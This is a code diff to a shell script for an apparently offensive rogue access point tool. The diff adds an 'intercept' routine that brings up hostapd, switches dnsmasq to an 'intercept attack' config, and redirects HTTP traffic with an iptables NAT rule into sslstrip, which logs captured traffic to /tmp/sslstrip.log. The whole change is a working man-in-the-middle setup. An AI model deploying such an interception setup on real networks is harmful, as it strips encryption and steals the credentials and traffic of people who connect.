@@ -9,7 +9,15 @@ function usage(){
 
 }
 function intercept(){
-	. message.sh check "hello"
+  . message.sh status "Starting Network Routine"
+  network intercept
+  . message.sh status "Iptables Rules going up"
+  iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to 1000
+  . message.sh status "Starting hostapd"
+  hostapd
+  . message.sh status "Starting sslstrip"
+  sslstrip -l 1000 -w /tmp/sslstrip.log
+
 }
 function captive_portal(){
   . message.sh check "Starting Network Routine"
@@ -45,7 +53,12 @@ function network(){
 	. message.sh status "Bring up wlan0"
 	ifconfig wlan0 up
 	. message.sh status "Configuring Dnsmasq"
-	cp conf/dnsmasq.conf /etc/dnsmasq.conf
+	if [ $1 == "intercept" ];then
+  		. message.sh status "Setup dnsmasq to intercept attack"
+		cp conf/dnsmasq.conf.intercept /etc/dnsmasq.conf
+	else
+		cp conf/dnsmasq.conf /etc/dnsmasq.conf
+	fi
 	/etc/init.d/dnsmasq start
 	. message.sh status "Enabling routing"
 	sysctl net.ipv4.ip_forward=1
